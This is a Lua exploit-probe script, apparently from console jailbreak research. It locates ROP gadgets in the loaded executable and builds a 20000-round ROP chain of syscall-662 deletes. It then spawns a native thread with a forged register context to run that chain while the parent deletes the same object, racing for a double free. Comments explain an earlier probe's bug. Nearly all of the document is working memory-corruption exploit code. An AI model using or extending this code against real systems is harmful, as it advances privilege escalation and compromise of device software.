-- CRASH_CLASS: HIGH
-- PROBE 1050a: double free on the polled delete, parent racing a native child
-- 1047a's child executed an unintended extra syscall at thread entry: thr_create starts at
-- RIP with RAX/RDI/RSI/RDX loaded, so ctx.RAX=662 made the *bootstrap* call a delete of the
-- same id, and the chain then saw only misses.  Here the entry call is a benign getpid and
-- the deletes start at chain word 0.  One zero status word in 20000 = normal; two = double
-- free of the same context.
print("=== PROBE 1050a: polled double free, parent vs native child ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local function mmap(px) return to_num(select(2, pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end))) end
local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local fn = to_num(syscall.pipe.fn_addr)
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E, 0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A, 0xC3))
local store = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] eboot=%08X g=%s/%s/%s/%s/%s/%s", ebase, tostring(pop_rax), tostring(pop_rdi),
    tostring(pop_rsi), tostring(pop_rdx), tostring(store), tostring(jmp_g)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g) then print("[!] gadget missing"); return end

local ROUNDS = 20000
local block = mmap(0x400000)
local D = mmap(0x4000)
local ID = mmap(0x4000)
local ST = mmap(0x40000)
local RES = mmap(0x4000)
print(string.format("[A] block=%08X ID=%08X ST=%08X", block, ID, ST))
if block == 0 or ID == 0 or ST == 0 then print("[!] mmap failed"); return end

local sc669, sc662, sc664 = mk(669), mk(662), mk(664)
wd(D + 0x00, 0); wd(D + 0x08, 0); wd(D + 0x10, 0); wd(D + 0x18, 0); wd(D + 0x20, -1); wd(D + 0x24, 0)
wd(ID, 0)
local okc, rvc = pcall(function() return sc669(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(ID)) end)
local id = rd(ID) or 0
print(string.format("[S] create ok=%s rv=%d id=%08X", tostring(okc), to_num(rvc), id))
if id == 0 then print("[!] create failed"); return end
local PO = mmap(0x4000)
wq(PO, uint64(id)); wq(ST, uint64(0))
local okp, rvp = pcall(function() return sc664(uint64(PO), uint64(1), uint64(ST)) end)
print(string.format("[S] poll ok=%s st=%08X rv=%d", tostring(okp), rq(ST) or 0, to_num(rvp)))
zero(ST, 0x40000)

local start = block + 0x4000
local function put(i, v) wq(start + 8 + i * 8, uint64(v)) end
local n = 0
for r = 0, ROUNDS - 1 do
    put(n, pop_rdi); put(n + 1, ID); put(n + 2, pop_rsi); put(n + 3, 1)
    put(n + 4, pop_rdx); put(n + 5, ST + r * 8); put(n + 6, pop_rax); put(n + 7, 662); put(n + 8, fn)
    n = n + 9
end
put(n, pop_rax); put(n + 1, 20); put(n + 2, fn)
put(n + 3, pop_rdi); put(n + 4, RES); put(n + 5, store)
put(n + 6, pop_rdi); put(n + 7, 0); put(n + 8, pop_rax); put(n + 9, 431); put(n + 10, fn); put(n + 11, jmp_g)
print(string.format("[B] chain words=%d bytes=%d head=%08X", n + 12, (n + 12) * 8, start))

local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100, RAX = 0x078 }
local ctx = memory.alloc(0x500); zero(ctx, 0x500)
wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8)); wq(ctx + Ctx.RAX, uint64(20))
local tb = memory.alloc(8); wq(tb, uint64(0))
local oksp, rvsp = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
print(string.format("[S] spawn ok=%s rv=%s", tostring(oksp), tostring(to_num(rvsp))))
if not oksp then print("[!] spawn failed"); return end

-- parent deletes the same id immediately: the closest we get to two deleters at once
wd(ST + 0x3F000, 0)
local okd, rvd = pcall(function() return sc662(uint64(ID), uint64(1), uint64(ST + 0x3F000)) end)
local pst = rd(ST + 0x3F000) or 0
local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, 300000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end)
local zeros, nonzero, first_zero, first_nz = 0, 0, -1, -1
for r = 0, ROUNDS - 1 do
    local s = rd(ST + r * 8) or 0
    if s == 0 then zeros = zeros + 1 if first_zero < 0 then first_zero = r end
    else nonzero = nonzero + 1 if first_nz < 0 then first_nz = r end end
end
print(string.format("[P] parent delete ok=%s st=%08X", tostring(okd), pst))
print(string.format("[D] child zero=%d nonzero=%d first_zero=%d first_nonzero=%d res=%d",
    zeros, nonzero, first_zero, first_nz, rd(RES) or 0))
print(string.format("[D] total successes=%d (1 = normal, >1 = double free)", zeros + (pst == 0 and 1 or 0)))
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
